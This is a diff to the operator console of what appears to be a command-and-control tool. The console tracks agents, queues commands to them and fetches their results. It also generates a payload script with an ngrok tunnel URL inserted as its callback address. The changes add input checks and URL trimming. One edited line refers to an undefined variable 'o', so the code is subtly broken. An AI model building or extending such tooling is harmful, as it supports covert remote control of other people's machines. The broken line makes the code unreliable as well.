@@ -61,6 +61,8 @@ class Handler(object):
         for i in man:
                 commands.append(i)
         def handle(self,cmd):
+                if cmd == "" or cmd == " ":
+                        return None
                 try:
                         base = cmd.split(" ")[0]
                 except:
@@ -93,6 +95,9 @@ class Handler(object):
                 elif base == "agent":
                         try:
                                 setagent = cmd.split(" ")[1]
+                                if not setagent in server.agents:
+                                        print(error("Agent does not exist"))
+                                        return None
                                 var.current_agent = setagent
                                 print(ok("Set agent as '%s'" % c(var.current_agent,"cyan")))
                                 return None
@@ -139,7 +144,7 @@ class Handler(object):
                         print("Tasks:")
                         for i in tsk:
                                 if i['status'] == sort or sort == "all":
-                                        print("Agent: %s, cmd: %s, id: %s, time: %s" % (c(i['agent'],"cyan"),c(i['cmd'],"cyan"),c(i['id'],"cyan"),c(i['time'],"cyan")))
+                                        print("Agent: %s, cmd: %s, id: %s, timestamp: %s, status: %s" % (c(i['agent'],"cyan"),c(i['cmd'],"cyan"),c(i['id'],"cyan"),c(i['time'],"cyan"),c(o['status'],"cyan")))
                         return None
                 elif base == "getResult":
                         try:
@@ -165,7 +170,10 @@ class Handler(object):
                         except FileNotFoundError:
                                 print(fail("Template does not exist"))
                                 return None
-                        ngurl = ngrok.get_url()
+                        ngurl = ngrok.get_url().strip()
+                        if ngurl == "":
+                                print(error("Ngrok url not found. Perhaps server is not running?"))
+                                return None
                         tplate = ("baseurl = \"%s\"\n" % ngurl) + tplate
                         with open("/tmp/payload.py","w") as f:
                                 f.write(tplate)
@@ -185,7 +193,7 @@ class Handler(object):
                         print(error("No command with that id found"))
                         return None
                 elif base == "ngrokUrl":
-                        print("Ngrok url: [%s]" % c(ngrok.get_url(),"green"))
+                        print("Ngrok url: [%s]" % c(ngrok.get_url().strip(),"green"))
                         return None
                 elif base == "python":
                         try:
@@ -209,7 +217,7 @@ def print_banner():
 
 
 def do_ngrok():
-        url = ngrok.run_ngrok()
+        url = ngrok.run_ngrok().strip()
         print(ok("Ngrok server url: "+str(url)))
 
 def start_sequence():
